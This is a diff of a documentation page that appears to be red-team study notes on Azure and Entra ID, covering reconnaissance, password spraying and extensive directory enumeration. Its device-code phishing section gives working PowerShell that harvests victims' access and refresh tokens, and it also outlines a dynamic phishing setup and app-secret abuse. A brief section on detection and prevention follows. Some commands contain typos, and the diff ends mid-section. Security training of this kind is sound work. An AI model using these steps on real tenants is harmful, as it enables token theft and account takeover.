@@ -1,36 +1,179 @@
 import { Tab, Tabs } from 'nextra-theme-docs'
 
+## Using APIs
+Usually we only change the endpoint we call depending on the resource we enumerate or change both endoint and method `GET/POST` and parameters if we'll change the action
+```powershell copy filename="Powershell" showLineNumbers
+$URI = "https://graph.microsoft.com/v1.0/Applications"
+ 
+$RequestParams = @{
+Method  = 'GET'
+Uri     = $URI
+Headers = @{
+    'Authorization' = "Bearer $GraphAccessToken"
+}
+}
+(Invoke-RestMethod @RequestParams).value
+```
+Change the URI depending on the resource you're enumerating
+| **Method** | **Endpoint** | **Action** | **POST Parameters** |
+| ----| ---- | ----| ---- |
+| `GET`  | https://graph.microsoft.com/v1.0/Applications |  List applications |test
+| `GET`  | https://graph.microsoft.com/v1.0/servicePrincipals/{ID}/appRoleAssignments | List roles assigned to the app | test 
+## CLI Tools
+<Tabs items={['MG Module']}>
+- It allows both **delegated** and **application-only** access.
+- For **delegated access** a user consent and permission scope are required when used for the first time.
+- For **app-only access** an admin consent is required
+```powershell copy filename="Powershell"
+# ==============================================
+# Connect to Microsoft Graph - delegated access
+# ==============================================
+
+# Find required permissions for Get-MgUser
+Find-MgGraphCommand -command Get-MgUser | Select -First 1 -ExpandProperty Permissions
+
+# Interactive Authentication
+Connect-MgGraph -Scopes "User.Read.All"
+
+# Device Code Flow
+Connect-MgGraph -Scopes "User.Read.All" -UseDeviceAuthentication
+
+# Connect with access token
+$GraphAccessToknn = "ey...."
+Connect-MgGraph -AccessToken ($GraphAccessToken | ConvertTo-SecureString -AsPlainText -Force)
+
+# ==============================================
+# Connect to Microsoft Graph - App-Only Access
+# ==============================================
+
+# Using Certificate (CertificateThumbPrint, CertificateName, or Certificate from store supported)
+Connect-MgGraph -ClientId "<AppID>" -TenantId "<TenantID>" -CertificateThumbprint "<CERT_THUMBPRINT>"
+
+# Using Client Secret (use Get-Credential or a PSCredential object)
+Connect-MgGraph -TenantId "<TenantID>" -ClientSecretCredential $ClientSecretCredential
+
+# Using Managed Identity
+Connect-MgGraph -Identity
+
+# ==============================================
+# Discover Commands
+# ==============================================
+
+# Using Powershell help system
+Get-Help Get-MgUser -Detailed
+Get-Command -Module Microsoft.Graph* -Verb Get -Noun *user*
+
+# ==============================================
+# Find Commands
+# ==============================================
+Find-MgGraphCommand -Command *User*
+Find-MgGraphCommand -Uri .*users -Method Get
+
+# ==============================================
+# Find Permissions
+# ==============================================
+# list delegated and application permissions for different actions or domain (like application or directory)
+Find-MgGraphPermission application
+
+```
+</Tabs>
 ## Recon
-#### Recon Azure Tenant using [AADInternals](https://github.com/Gerenios/AADInternals)
-```powershell filename="Powershell" 
-# Get tenant name, authentication, brand name (usually same as directory name) and domain name
-Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
+### Recon Azure Tenant
+#### Check if Azure tenant exists
+    visit this URL
+    ```powershell
+    Get XML response
+    https://login.microsoftonline.com/getuserrealm.srf?xml=1&login==username@defcorp.onmicrosoft.com
+    Get JSON Response
+    https://login.microsoftonline.com/getuserreal.srf?json=1&login==username@defcorp.onmicrosoft.com
+    ```
+    Response
+    <Tabs items={['XML', 'JSON']}>
+        <Tab>
+        ```xml showLineNumbers {5}
+        <RealmInfo Success="true">
+        <State>4</State>
+        <UserState>1</UserState>
+        <Login>=something@defcorphq.onmicrosoft.com</Login>
+        <NameSpaceType>Managed</NameSpaceType>
+        <DomainName>defcorphq.onmicrosoft.com</DomainName>
+        <IsFederatedNS>false</IsFederatedNS>
+        <FederationBrandName>Defense Corporation</FederationBrandName>
+        <CloudInstanceName>microsoftonline.com</CloudInstanceName>
+        <CloudInstanceIssuerUri>urn:federation:MicrosoftOnline</CloudInstanceIssuerUri>
+        </RealmInfo>
+        ```
+        </Tab>
+        <Tab>
+       ```json showLineNumbers {5}
+       {
+        "State": 4,
+        "UserState": 1,
+        "Login": "=username@defcorp.onmicrosoft.com",
+        "NameSpaceType": "Managed",
+        "DomainName": "defcorp.onmicrosoft.com",
+        "FederationBrandName": "Defcorp Private Limited",
+        "CloudInstanceName": "microsoftonline.com",
+        "CloudInstanceIssuerUri": "urn:federation:MicrosoftOnline"
+        }
+    ```     
+        </Tab>
+    </Tabs>
+        Look for the `NameSpaceType` attribute:
+    - `Managed` --> means It doesn't use Federated services `ADFS`
+    - `Unknown` --> means tenant doesn't exist.
 
-# Get Tenant ID
-Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
+#### Get the tenant Information
+<Tabs items={['Manual', 'AADInternals']} >
+    <Tab>
+    Visit
+    ```powershell
+    # Get tenant id
+    https://login.microsoftonline.com/defcorp.onmicrosoft.com/.well-known/openid-configuration
+    ```
+    </Tab> 
+     <Tab>
+    ```powershell filename="Powershell" copy
+    # Get tenant name, authentication, brand name (usually same as directory name) and domain name
+    Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
 
-# Get Tenant Domain 
-Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
+    # Get Tenant ID
+    Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
 
-# Get all information
-Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
-```
+    # Get Tenant Domain 
+    Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
 
-#### Recon Email IDs using [o365creeper](https://github.com/LMGsec/o365creeper)
-```powershell filename="Powershell"
-# Enumerate Email IDs by making requests to the `GetCredentialType` API
-python.exe o365creeper.py -f emails.txt -o validemails.txt
-```
+    # Get all information
+    Invoke-AADIntReconAsOutsider -DomainName defcorphq.onmicrosoft.com
+    ```
+    </Tab>
+</Tabs>
 
-#### Recon Azure Services by [microburst](https://github.com/NetSPI/MicroBurst)
-```powershell filename="Powershell"
-# Enumerates subdomains by subdomain guessing
-Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
-```
+### Recon Email IDs 
+<Tabs items={['o365creeper']}>
+    <Tab>
+    ```powershell filename="Powershell"
+    # Enumerate Email IDs by making requests to the `GetCredentialType` API
+    python.exe o365creeper.py -f emails.txt -o validemails.txt
+    ```
+    </Tab>
+</Tabs>
 
-## Initial Access
+### Recon Azure Services
+<Tabs items ={['Microburst']}>
+    <Tab>
+    ```powershell filename="Powershell"
+    # Enumerates subdomains by subdomain guessing
+    Import-Module MicroBurst.psm1
+    Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
+    ```
+    </Tab>
+</Tabs>
 
-### Password Spray against the exchange service 
+### Initial Access
+#### Password Spray & Bruteforce
+
+Against the exchange service 
 <Tabs items={['MailSniper', 'MSOLSpray']}>
     <Tab>
     ```powershell filename="Powershell" copy
@@ -46,82 +189,806 @@ Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
     </Tab>
 </Tabs>
 
+## Initial Access
+### Device Code Phishing
+<Tabs items={['Manual', 'Token Tactics', 'Graph Runner', 'GraphSpy']}>
+    <Tab>
+        1. Generate device_code
+            ```powershell copy filename="Powershell"
+            # This is a microsoft office client_id
+            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+
+            # This is all permissions scope
+            $Scope=".default offline_access"
+
+            $GrantType = "urn:ietf:params:oauth:grant-type:device_code"
+            $body = @{
+            "client_id" = $ClientID
+            "scope" = $Scope
+            }
+
+            $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
+            Write-Output $authResponse
+            ```
+        2. The response contains some parameterse. most important ones are `user_code`, `device_code` and `verification_uri`. 
+        3. Request tokens using the device_code
+            ```powershell copy filename="Powershell"
+            $body=@{
+            "client_id" = $ClientID
+            "grant_type" = $GrantType
+            "code" = $authResponse.device_code
+            }
+            $Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body -ErrorAction SilentlyContinue
+            $GraphAccessToken = $Tokens.access_token
+            ```
+    </Tab>
+    <Tab>
+    Using [TokenTactics](https://github.com/rvrsh3ll/TokenTactics)
+    ```powershell copy filename="Powershell"
+    # Generate user_code and will keep polling on /token for access and refresh tokens
+    Get-AzureToken -Client MSGraph
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # Will get a user_code and will keep polling on /token 
+    Get-GraphTokens
+    ```
+    </Tab>
+    <Tab>
+    GUI tool
+    </Tab>
+</Tabs>
+This attack has a single limitation which is that the `verification_uri` is only valid for `15` minutes. We can bypass that using:
+
+**Dynamic Device Code Phishing:** + **FOCI** Family Of Client IDs
+
+1. - In this attack we will send a link to the user that generates the `user_code` once the user clicks on it. so now the timer will start by user clicking the link.
+    We will need:
+    - **Storage account** to:
+        - Host the static website (The website that will be sent to the user as a phishing link)
+        - Store the tokens after being fetched by the Aunction App.
+    - **App Service**: To host [CORS Anywhere](https://github.com/Rob--W/cors-anywhere) application to bypass CORS limitations of Azure
+    - **Function App**:
+        - Request the tokens and store them in the storage account.
+
+2. Leverege [**FRT** and **FOCI**](azure-concepts)
+
+**Defending against Device Code Phishing:**
+    **Detection:**
+        - the attacker IP and Device that is logged in Entra ID Sign-in logs - as the authentication is initiated from there!
+        - Look at User sign-ins with Authentication Protocol: Device Code.
+    **Prevention:**
+        - Using Condition Access policies:
+            - Location based Conditional Access Policy.
+            - Device Code Authentication Flow Conditional Access Policy. (Allow or Block) device code flow for any Identity.
 
 ## Enumeration
+### Enumeration tools
+<Tabs items={['Azure Powershell', 'Azure CLI / Az cli']}>
+    <Tab>
+    - Is a powershell module from **Microsoft** for managing Azure resources.
+    - Can be used to enumerate both **Azure AD** and **Azure Resources**.
+    - Can request a token and can use it.
+    - Cmdlets for interacting with **Azure AD** always use `AzAd` 
+    ```powershell
+    $passwd = ConvertTo-SecureString"P@ssword" -AsPlainText -Force
+    $creds = New-ObjectSystem.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com",$passwd)
+    Connect-AzAccount -Credential$ creds
+
+    Get-AzADUser
+
+    # Cmdlets for interacting with other resources always use `Az`
+    Get-AzResource
+
+    # Find Cmdlets for a specific resource
+    Get-Command *az*
+    
+    # Get commands for Azure AD
+    Get-Command *azad*
+
+    Get-Command -Noun *vm* -Verb *Get*
+    ```
+    </Tab>
+    <Tab>
+    - A set of commands to manage Azure resources.
+    - Can be used with multiple clouds.
+    - Can be installed using MSI [Install-Azure-cli](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
+    ```powershell copy filename="Powershell"
+    # Login using the default browser
+    az login
+
+    # Login using credentials (users, service principals, managed identities of VMs)
+    az -login -u test@defcorphq.onmicrosoft.com -p P@ssw0rd
+    
+    # If the user has no permissions on the Subscription
+    az login -u test@defcorphq.onmicrosoft.com -p P@ssw0rd --allow-no-subscriptions
+
+    # configure azcli to set some default behaviour (output type, location, resource group etc.)
+    az configure
+    ```
+    </Tab>
+</Tabs>
+### Azure AD Enumeration
+Usually we use `AzureAD Module` or `AZ Powershell` to interact with **Azure AD**
 #### User Enumeration
-```powershell filename="Powershell"
-# Enumerate all users
-powershell Get-AzureADUser -All $true
+<Tabs items={['AzureAD Module', 'Az Powershell', 'Az cli']}>
+    <Tab>
+    ```powershell filename="Powershell"
+    # Enumerate all users
+    Get-AzureADUser -All $true
 
-# Enumerate a specific user
-Get-AzureADUser -ObjectId 'test@defcorphq.onmicrosoft.com'
+    # Enumerate a specific user
+    Get-AzureADUser -ObjectId 'test@defcorphq.onmicrosoft.com'
 
-# Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
-Get-AzureADUser -SearchString "admin"
-Get-AzureADUser -All $ |?{$_.Displayname -match "admin"}
+    # Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
+    Get-AzureADUser -SearchString "admin"
+    Get-AzureADUser -All $ |?{$_.Displayname -match "admin"}
 
-# List all attributes for a user
-Get-AzureADUser -ObjectId 'test@defcorphq.onmicrosoft.com' | fl *
+    # List all attributes for a user
+    Get-AzureADUser -ObjectId 'test@defcorphq.onmicrosoft.com' | fl *
 
-# Search attributes for all users that contain the string "password"
-Get-AzureADUser -All $true|%{$Properties = $_;$Properties.PSObject.Properties.Name |${if ($Properties.$_ -match 'password'){"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
+    # Search attributes for all users that contain the string "password"
+    Get-AzureADUser -All $true|%{$Properties = $_;$Properties.PSObject.Properties.Name |${if ($Properties.$_ -match 'password'){"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
 
-# All users who are synced from on prem
-Get-AzureADUser -All $true \|? {$_.OnPremisesSecurityIdentifier -ne $null}
+    # All users who are synced from on prem
+    Get-AzureADUser -All $true |? {$_.OnPremisesSecurityIdentifier -ne $null}
 
-# All users who are synced from AzureAD
-Get-AzureADUser -All $true \|? {$_.OnPremisesSecurityIdentifier -eq $null}
+    # All users who are synced from AzureAD
+    Get-AzureADUser -All $true |? {$_.OnPremisesSecurityIdentifier -eq $null}
 
-# Objects created by any user (use -ObjectId for a specific user)
-Get-AzureADUser \| Get-AzureADUserCreatedObject
-```
+    # Objects created by any user (use -ObjectId for a specific user)
+    Get-AzureADUser | Get-AzureADUserCreatedObject
+    ```
+    </Tab>
+    <Tab>
+    ```powershell filename="Powershell"
+    # Enumerate all users
+    Get-AzADUser
+
+    # Enumerate a specific user
+    Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
+
+    # Search for a user based on string in first characters of DisplayName (wildcard not supported)
+    Get-AzADUser -SearchString "admin"
+
+    # Search for users who contain the word "admin" in their DisplayName
+    Get-AzADUser | ? { $_.DisplayName -match "admin" }
+    ```
+    </Tab>
+    ```powershell copy filename="Powershell"
+   # Enumerate all users
+    az ad user list
+
+    # Enumerate all users and only show their displayName in a table
+    az ad user list --query "[].[displayName]" -o table
+
+    # Enumerate a specific user (lists all attributes)
+    az ad user show --id test@defcorphq.onmicrosoft.com
+
+    # Search for users who contain the word "admin" in their DisplayName (case sensitive)
+    az ad user list --query "[?contains(displayName,'admin')].displayName" 
+
+    # In PowerShell, search for users who contain the word "admin" in their DisplayName (NOT case-sensitive)
+    az ad user list | ConvertFrom-Json | % { $_.displayName -match "admin" }    
+
+    # List all users who are synced from on-prem AD
+    az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
+
+    # List all users who are cloud-only (from Azure AD)
+    az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
+    ```
+</Tabs>
 #### Group Enumeration
-```powershell filename="Powershell"
-# List All Groups
-Get-AzureADGroup -All $true
+<Tabs items={['AzureAD Module', 'Az Powershell', 'Az cli']}>
+    <Tab>
+    ```powershell filename="Powershell"
+    # List All Groups
+    Get-AzureADGroup -All $true
 
-# Enumerate a specific group
-Get-AzureADGroup -ObjectId 783a312d 0de2 4490 92e4 539b0e4ee03e
+    # Enumerate a specific group
+    Get-AzureADGroup -ObjectId 783a312d 0de2 4490 92e4 539b0e4ee03e
 
-# Search for a group based on string in first characters of DisplayName (wildcard not supported)
-Get-AzureADGroup -SearchString "admin" \| fl *
+    # Search for a group based on string in first characters of DisplayName (wildcard not supported)
+    Get-AzureADGroup -SearchString "admin" \| fl *
 
-# Search for groups which contain the word "admin" in their name
-Get-AzureADGroup -All $true \|? {$_.Displayname -match "admin"}
+    # Search for groups which contain the word "admin" in their name
+    Get-AzureADGroup -All $true \|? {$_.Displayname -match "admin"}
 
-# Get Groups that allow Dynamic membership (Note the cmdlet name)
-Get-AzureADMSGroup \|?{$_.GroupTypes -eq 'DynamicMembership'}
+    # Get Groups that allow Dynamic membership (Note the cmdlet name)
+    Get-AzureADMSGroup \|?{$_.GroupTypes -eq 'DynamicMembership'}
 
-# All groups that are synced from on prem (note that security groups are not synced)
-Get-AzureADGroup -All $true \|?{$_.OnPremisesSecurityIdentifier -ne $null }
+    # All groups that are synced from on prem (note that security groups are not synced)
+    Get-AzureADGroup -All $true \|?{$_.OnPremisesSecurityIdentifier -ne $null }
 
-# All groups that are from Azure AD
-Get-AzureADGroup -All $true \|?{$_.OnPremisesSecurityIdentifier -eq $null }
+    # All groups that are from Azure AD
+    Get-AzureADGroup -All $true \|?{$_.OnPremisesSecurityIdentifier -eq $null }
 
-# Get group members
-Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
+    # Get group members
+    Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
 
-# Get groups and roles where the specified user is a member
-Get-AzureADUser -SearchString 'test' \| Get-AzureADUserMembership -ObjectId 'test@defcorphq.onmicrosoft.com'
-```
+    # Get groups and roles where the specified user is a member
+    Get-AzureADUser -SearchString 'test' \| Get-AzureADUserMembership -ObjectId 'test@defcorphq.onmicrosoft.com'
+    ```
+    </Tab>
+    <Tab>
+        ```powershell filename="Powershell"
+        # List all groups
+        Get-AzADGroup
+
+        # Enumerate a specific group
+        Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
+
+        # Search for a group based on string in first characters of DisplayName (wildcard not supported)
+        Get-AzADGroup -SearchString "admin" | fl *
+
+        # Search for groups which contain the word "admin" in their name
+        Get-AzADGroup | ? { $_.DisplayName -match "admin" }
+        ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # List all groups
+    az ad group list
+
+    # List all groups and only show their displayName in a table
+    az ad group list --query "[].[displayName]" -o table
+
+    # Enumerate a specific group using display name
+    az ad group show -g "VM Admins"
+
+    # Enumerate a specific group using object id
+    az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e
+
+    # Search for groups that contain the word "admin" in their DisplayName (case sensitive)
+    az ad group list --query "[?contains(displayName,'admin')].displayName"
+
+    # In PowerShell, search for groups that contain the word "admin" in their DisplayName (NOT case-sensitive)
+    az ad group list | ConvertFrom-Json | % { $_.displayName -match "admin" }
+
+    # List all groups that are synced from on-prem AD
+    az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
+
+    # List all groups that are cloud-only (from Azure AD)
+    az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
+
+    # Get members of a group and list their display names in a table
+    az ad group member list -g "VM Admins" --query "[].[displayName]" -o table
+
+    # Check if a user is a member of the specified group
+    az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787
+
+    # Get the object IDs of the groups of which the specified group is a member
+    az ad group get-member-groups -g "VM Admins"
+
+    ```
+    </Tab>
+</Tabs>
 #### Role Enumeration
-```powershell filename="Powershell"
-# Get all available role templates
-Get-AzureADDirectoryroleTemplate
+<Tabs items={['AzureAD Module', 'AzureADPreview', 'az cli', 'AZ Powershell']}>
+    <Tab>
+    ```powershell filename="Powershell"
+    # Get all available role templates
+    Get-AzureADDirectoryroleTemplate
 
-# Get all roles
-Get-AzureADDirectoryRole
+    # Get all roles
+    Get-AzureADDirectoryRole
 
-# Enumerate users to whom roles are assigned
-Get-AzureADDirectoryRole -Filter "DisplayName" -eq 'GlobalAdministrator' \| Get-AzureADDirectoryRoleMember
-```
+    # Enumerate users to whom roles are assigned
+    Get-AzureADDirectoryRole -Filter "DisplayName" -eq 'GlobalAdministrator' \| Get-AzureADDirectoryRoleMember
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    Import-Module .\AzureADPreview.psd1
+    Connect-AzureAD -Credential $creds
+
+    # Enumerate Custom roles
+    Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # List roles assigned to an account
+    az role assignment list --assignee tig00r@mycorp.onmicrosoft.com
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/automation-account-name
+    ```
+    </Tab>
+</Tabs>
 #### Device Enumeration
 ```powershell filename="Powershell"
+# List Registered owners of all the devices
+Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
 
+# Get all Azure joined and registered devices
+Get-AzureADDevice -All $true | fl *
+
+# Get the device configuration object (note the RegistrationQuota in the output)
+Get-AzureADDeviceConfiguration | fl *
+
+# List Registered users of all the devices
+Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
+
+# List devices owned by a user
+Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com
+
+# List devices registered by a user
+Get-AzureADUserRegisteredDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com
+
+# List devices managed using Intune
+Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com
+
+# List devices that are compliant
+Get-AzureADDevice -All $true | ? { $_.IsCompliant -eq "True" }
 ```
 #### Apps Enumeration
-#### Service Principals Enumeration
+<Tabs items={['AzureAD Module', 'Az Powershell', 'Az cli']}>
+    <Tab>
+    ```powershell filename="Powershell" copy
+    # Get all the application objects registered with the current tenant 
+    # (visible in App Registrations in Azure portal). 
+    # An application object is the global representation of an app.
+    Get-AzureADApplication -All $true
 
+    # Get all details about an application
+    Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | fl *
+
+    # Get an application based on the display name
+    Get-AzureADApplication -All $true | ? { $_.DisplayName -match "app" }
+
+    # Show the applications with an application password (password value itself is not shown)
+    Get-AzureADApplicationPasswordCredential
+
+    # Get owner of an application
+    Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | Get-AzureADApplicationOwner | fl *
+
+    # Get Apps where a User has a role (exact role is not shown)
+    Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
+
+    # Get Apps where a Group has a role (exact role is not shown)
+    Get-AzureADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e | Get-AzureADGroupAppRoleAssignment | fl *
+    
+    # Best way to check if we can abuse an app is to check if we can set credentials to it.
+    # Use Add-AzADAppSecret.ps1
+    Add-AzADAppSecret -GraphToken $graphtoken -Verbose
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # Get all the application objects registered with the current tenant
+    # (visible in App Registrations in Azure portal).
+    # An application object is the global representation of an app.
+    Get-AzADApplication
+
+    # Get all details about a specific application
+    Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0 | fl *
+
+    # Get applications where the display name matches "app"
+    Get-AzADApplication | ? { $_.DisplayName -match "app" }
+
+    # List all apps that have at least one application password (credential)
+    Get-AzADApplication |
+    Where-Object { (Get-AzADAppCredential -ObjectId $_.Id -ErrorAction SilentlyContinue) }
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # Get all application objects registered with the current tenant
+    az ad app list
+
+    # Get all application objects and only show their displayName in a table
+    az ad app list --query "[].[displayName]" -o table
+
+    # Get all details about an application using identifier URI, application ID, or object ID
+    az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
+
+    # Get an application based on the display name (case sensitive)
+    az ad app list --query "[?contains(displayName,'app')].displayName" 
+    
+    # In PowerShell, search for apps that contain the word "app" in their DisplayName (NOT case-sensitive)
+    az ad app list | ConvertFrom-Json | % { $_.displayName -match "app" }
+
+    # Get owner of an application and list their display names in a table
+    az ad app owner list --id a1333e88-1278-41bf-8145-155a069ebed0 --query "[].[displayName]" -o table
+
+    # List applications that have password credentials
+    az ad app list --query "[?passwordCredentials!=null].displayName"
+
+    # List applications that have key credentials (certificate authentication)
+    az ad app list --query "[?keyCredentials!=null].displayName"
+
+    # List web apps
+    az webapp list --query "[].[name]" -o table
+
+    # List app services
+    az webapp list --query "[].[name]" -o table
+
+    # List function apps
+    az functionapp list --query "[].[name]" -o table
+    ```
+    </Tab>
+</Tabs>
+#### Service Principals Enumeration
+<Tabs items={['AzureAD Module', 'Az Powershell', `Az cli`]}>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # Get all Service Principals
+    Get-AzureADServicePrincipal -All $true
+
+    # Get all details about a specific service principal
+    Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *
+
+    # Get a service principal based on the display name
+    Get-AzureADServicePrincipal -All $true | ? { $_.DisplayName -match "app" }
+
+    # Get owner of a service principal
+    Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwner | fl *
+
+    # Get objects owned by a service principal
+    Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwnedObject
+
+    # Get objects created by a service principal
+    Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalCreatedObject
+
+    # Get role and group membership of a service principal
+    Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalMembership | fl *
+
+    # Get membership details for all service principals
+    Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
+    ```
+    </Tab>
+    ```powershell copy filename="Powershell"
+    # Enumerate Service Principals (visible as Enterprise Applications in Azure Portal).
+    # A Service Principal is the local representation of an app in a specific tenant.
+    # It is the security object that can be assigned Azure roles (acts like a "service account").
+
+    # Get all service principals
+    Get-AzADServicePrincipal
+
+    # Get all details about a specific service principal
+    Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *
+
+    # Get service principals where the display name matches "app"
+    Get-AzADServicePrincipal | ? { $_.DisplayName -match "app" }
+    ```
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # Get all service principals
+    az ad sp list --all
+
+    # Get all service principals and only show their displayName in a table
+    az ad sp list --all --query "[].[displayName]" -o table
+
+    # Get all details about a service principal using service principal id or object id
+    az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
+
+    # Get a service principal based on the display name (case sensitive)
+    az ad sp list --all --query "[?contains(displayName,'app')].displayName"
+
+    # In PowerShell, search for service principals that contain the word "app" in their DisplayName (NOT case-sensitive)
+    az ad sp list --all | ConvertFrom-Json | % { $_.displayName -match "app" }
+
+    # Get owner of a service principal and list their display names in a table
+    az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query "[].[displayName]" -o table
+
+    # Get service principals owned by the current user
+    az ad sp list --show-mine
+
+    # List service principals (apps) that have password credentials
+    az ad sp list --all --query "[?passwordCredentials!=null].displayName"
+
+    # List service principals (apps) that have key credentials (certificate authentication)
+    az ad sp list --all --query "[?keyCredentials!=null].displayName"
+    ```
+    </Tab>
+</Tabs>
+### Azure Resources Enumeration
+<Tabs items={['Using APIs', 'AZ Powershell', 'az cli', 'Azure AD Module']}>
+    <Tab>
+    List all subscriptions with **ARM** or **Microsoft Graph**
+    ```Powershell copy filename="Powershell"
+    $Token = 'eyJ0eXAi..'
+    $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
+
+    $RequestParams = @{
+        Method  = 'GET'
+        Uri     = $URI
+        Headers = @{
+            Authorization = "Bearer $Token"
+        }
+    }
+    (Invoke-RestMethod @RequestParams).value
+    ```
+    </Tab>
+    <Tab>
+    Can request a token and can use it
+    ```powershell copy filename="Powershell"
+    # Install Az Powershell
+    Install-Module az
+    
+    # Connect using credentials
+    Connect-AzAccount -Credential $creds
+
+    # Connect using an access token
+    Connect-AzAccount AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA ...
+
+    # Using other tokens
+    Connect-AzAccount AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA ... -GraphAccessToken blablabla...
+
+    # If you are already connected to a tenant, request an access token for resource manager (ARM)
+    Get-AzAccessToken
+    (Get-AzAccessToken).Token
+
+    # Request an access token for AAD Graph to access Azure AD. Supported tokens. Supported tokens AadGraph , AnalysisServices , Arm, Attestation, Batch, DataLake , KeyVault , OperationalInsights , ResourceManager , Synapse
+    Get-AzAccessToken -ResourceTypeName AadGraph
+
+    # For Microsoft-Graph
+    Get-AzAccessToken -Resource "https://graph.microsoft. Token"
+
+    # Connect using an access token
+    Connect-AzAccount AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA ...
+
+    # Using other tokens
+    Connect-AzAccount AccountId test@defcorphq@onmicrosoft.com -AccessToken eyJ0eXA ... -GraphAccessToken blablabla...
+
+    # Get the information about the current context (Account, Tenant, Subscription etc.)
+    Get-AzContext
+
+    # List all available contexts
+    Get-AzContext -ListAvailable
+
+    # Enumerate subscriptions accessible by the current user
+    Get-AzSubscription
+
+    # Enumerate all resources visible to the current user
+    Get-AzResource
+
+    # Enumerate all Azure RBAC role assignments
+    Get-AzRoleAssignment
+
+
+    # List all VMs where current user has at least Reader role
+    Get-AzVM | fl
+
+    # Check if the vm has a public ip
+    Get-AzVM -Name name -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
+
+    # Get public ip address attached to a vm 
+    Get-AzPublicIpAddress -Name bkpadconnectIP
+
+
+    # List app services and function apps
+    Get-AzWebApp 
+
+    # List app services only
+    Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
+    ```
+    </Tab>
+    <Tab>
+    ```powershell copy filename="Powershell"
+    # Request an access token ARM
+    # Supported tokens -aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
+    az account get-access-token
+
+    # Request token for graph. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
+    az account get-access-token -resource-type ms-graph
+
+    # Clear tokens
+    az logout
+
+    # Get details of the current tenant (uses the account extension)
+    az account tenant list
+
+    # Get details of the current subscription (uses the account extension)
+    az account subscription list
+
+    # List the current signed-in user
+    az ad signed-in-user show
+
+    # Find popular az CLI commands related to "vm"
